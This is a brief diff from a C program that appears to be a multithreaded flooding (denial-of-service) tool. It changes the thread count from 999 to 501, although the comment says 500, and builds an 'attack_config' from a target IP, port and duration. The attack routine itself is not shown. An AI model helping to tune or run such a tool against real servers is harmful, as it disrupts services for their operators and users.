@@ -72,7 +72,7 @@ int main(int argc, char *argv[]) {
     printf("\033[1;37m🛰️  𝐌𝐨𝐝𝐞     : \033[1;32m699𝐦𝐬 𝐏𝐢𝐧𝐠 + 𝐌𝐚𝐭𝐜𝐡 𝐓𝐢𝐦𝐞𝐨𝐮𝐭\n");
     printf("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n");
 
-    int thread_count = 999; // Updated to 500 threads
+    int thread_count = 501; // Updated to 500 threads
     pthread_t threads[thread_count];
     struct attack_config config = {target_ip, target_port, target_duration};
 
